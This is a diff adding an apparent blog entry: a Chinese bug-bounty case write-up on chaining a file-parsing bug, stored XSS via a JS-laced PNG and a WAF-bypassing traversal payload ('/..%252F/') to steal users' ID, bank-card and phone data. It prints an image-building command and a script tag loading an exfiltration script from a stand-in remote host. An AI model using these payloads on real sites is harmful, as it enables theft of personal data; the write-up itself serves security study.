@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>SRC案例-用组合拳在SRC官网盗走你的个人信息</title>
+    <link href="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/"/>
+    <url>/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/</url>
+    
+    <content type="html"><![CDATA[<blockquote><p>声明：本SRC案例来自J0神，此处只是做学习研究之用</p></blockquote><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><ol><li>先是在某SRC官网FUZZ出一处图片显示接口，发现image__name参数是图片路径，那么有几个可尝试的点：文件包含getshell；目录穿越；ssrf……</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://xxx.cn/xxxx/ueditor?image_name=/xxx.png<br></code></pre></td></tr></table></figure><ol start="2"><li>经过尝试，文件包含、ssrf都不行，只是拼接读取了远程资源站的图⽚。但在给路径后加上”+”后，奇迹出现了：</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://xxx.cn/xxxx/ueditor?image_name=/xxx.png+<br></code></pre></td></tr></table></figure><img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/1.png" class=""><p>图⽚被意外的解析成了HTML⻚⾯，此处存在文件解析漏洞！</p><ol start="3"><li>既然能把png解析为html，那么我们构造一个带有JS代码的图片，访问路径，加上”+”，就构成了存储型XSS</li><li>继续尝试目录穿越，&#x2F;..&#x2F;..&#x2F;3.png，出现了自研WAF，拦截了</li></ol><img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/2.png" class=""><ol start="5"><li>没事，使用burp FUZZ一下就bypass了</li></ol><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Payload</span><span class="hljs-punctuation">: </span>/..%252F/<br></code></pre></td></tr></table></figure><img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/3.png" class=""><h2 id="漏洞利⽤"><a href="#漏洞利⽤" class="headerlink" title="漏洞利⽤"></a>漏洞利⽤</h2><p>现在已经可以存储型XSS+目录穿越了，又已知该SRC官网因为要打款奖励，所以需要用户填写个⼈信息(姓名，⼿机号，sfz等信息)，⽽这些信息⽤户自己可以在个人中心处查看，于是直接打一套组合拳提升危害，去盗取这些个人信息</p><ol><li>利⽤010Editor或copy命令，构造含有恶意代码的图⽚</li></ol><ul><li>010Editor：就不多说了，以16进制方式打开后，直接把js代码加在末尾就可以了</li><li>copy命令：</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">copy tiny.png /b + code.txt /a tiny_code.png<br></code></pre></td></tr></table></figure><p> 拿一张很小的普通图片tiny.png，js代码写在code.txt，二者合成生成了tiny_code.png：插入了恶意js代码的图片</p><ul><li>code.txt</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;http://xxx.com/xxx/demo.js&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>这个<a href="http://xxx.com/xxx/demo.js%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E6%8A%8Ademo.js%E9%83%A8%E7%BD%B2%E5%9C%A8%E4%BA%86%E8%BF%9C%E7%A8%8BXSS%E5%B9%B3%E5%8F%B0%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9C%8B%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E6%9B%B4%E5%A4%9A%E7%9A%84JS%E4%BB%A3%E7%A0%81%EF%BC%8C%E4%B8%94%E6%96%B9%E4%BE%BF%E6%8E%A5%E6%94%B6%E6%89%A7%E8%A1%8C%E5%BE%97%E5%88%B0%E7%9A%84%E6%95%B0%E6%8D%AE">http://xxx.com/xxx/demo.js其实就是把demo.js部署在了远程XSS平台，这样看可以执行更多的JS代码，且方便接收执行得到的数据</a></p><ul><li>demo.js</li></ul><img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/4.png" class=""><p><strong>脚本会通过Ajax请求URL，使⽤DOMParser转换并解析DOM对象，提取⽤户身份证、银⾏卡、⼿机号、地址等信息后合并base64编码发送到XSS平台接收数据</strong></p><ol start="2"><li><p>构造好了恶意图片，那么就去找文件上传接口上传图片了，直接上传刚刚构造好的恶意图片，但是上传到的路径不是那个存在文件解析漏洞的路径下，于是目录遍历漏洞就派上用场了，在那个存在文件解析漏洞的接口image__name参数传入&#x2F;..%252F&#x2F;xxx&#x2F;xxx&#x2F;tiny_code.png穿越一下目录，就可以了</p></li><li><p>然后再构造一个，用来钓鱼跳转的网站，实现只要受害者访问该网站，就自动跳转去请求我们刚才的恶意图片链接(被解析为了html执行)，就会无感的触发其中已经构造好的js代码，去远程调用XSS平台中的demo.js，获取SRC官网个人中心处的个人信息，并把数据发送给XSS平台接收</p></li></ol><ul><li>钓鱼跳转网站</li></ul><img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/5.png" class=""><ul><li>构造好的恶意图片链接(被解析为了html执行)</li></ul><img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/6.png" class=""><ul><li>XSS平台接收到数据</li></ul><img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/7.png" class=""><ul><li>成功窃取到受害者的信息，base64解码即可</li></ul><img src="/2024/07/19/SRC%E6%A1%88%E4%BE%8B-%E7%94%A8%E7%BB%84%E5%90%88%E6%8B%B3%E5%9C%A8SRC%E5%AE%98%E7%BD%91%E7%9B%97%E8%B5%B0%E4%BD%A0%E7%9A%84%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF/8.png" class=""><h2 id="技术点总结"><a href="#技术点总结" class="headerlink" title="技术点总结"></a>技术点总结</h2><ol><li>Fuzz出接⼝及参数,拼接+号解析成HTML⻚⾯</li><li>URL拼接时BypassWAF进⾏⽬录穿越</li><li>使⽤DOMParser转换为DOM对象并提取表单input值，后通过window.btoa函数base64编码字符串</li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>SRC挖掘案例</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>用组合拳在SRC官网盗走你的个人信息</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>SRC挖掘思路清单一</title>
     <link href="/2024/07/19/SRC%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF%E6%B8%85%E5%8D%95%E4%B8%80/"/>
     <url>/2024/07/19/SRC%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF%E6%B8%85%E5%8D%95%E4%B8%80/</url>
